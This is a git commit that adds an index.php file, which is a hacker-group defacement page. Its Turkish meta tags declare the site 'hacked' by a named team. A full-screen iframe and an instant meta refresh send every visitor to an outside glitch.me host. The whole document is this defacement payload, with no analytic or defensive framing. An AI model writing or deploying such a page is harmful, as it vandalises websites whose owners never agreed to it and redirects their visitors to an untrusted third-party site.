a21806fab5968e3bc91d26ab2785ef6ad36a0140
Tuğrul Bey <80987550+tugrulbey@users.noreply.github.com>
2022-10-15 17:14:32 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<html style="font-size: 16px;" class="u-responsive-md"><head><meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="ASLAN NEFERLER TİM | 9TUĞ KOMUTANLIĞI!!">
+<meta property="og:description" content="ASLAN NEFERLER TİM 9TUĞ KOMUTANLIĞI TARAFINDAN HACKLENDiNiZ!..">
+<meta property="og:image" content="https://i.hizliresim.com/dazzas1.jpg">
+<meta property="og:url" content="httpS://aslanneferler.org/">
+<meta name="twitter:card" content="summary_large_image"> 
+ <title>ASLAN NEFERLER TİM | GECE UZUN MEVZU DERİN</title></head>
+<iframe src="https://flying-pyrite-rayon.glitch.me/" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+<meta http-equiv="refresh" content="0;URL=https://flying-pyrite-rayon.glitch.me/">
+</iframe>
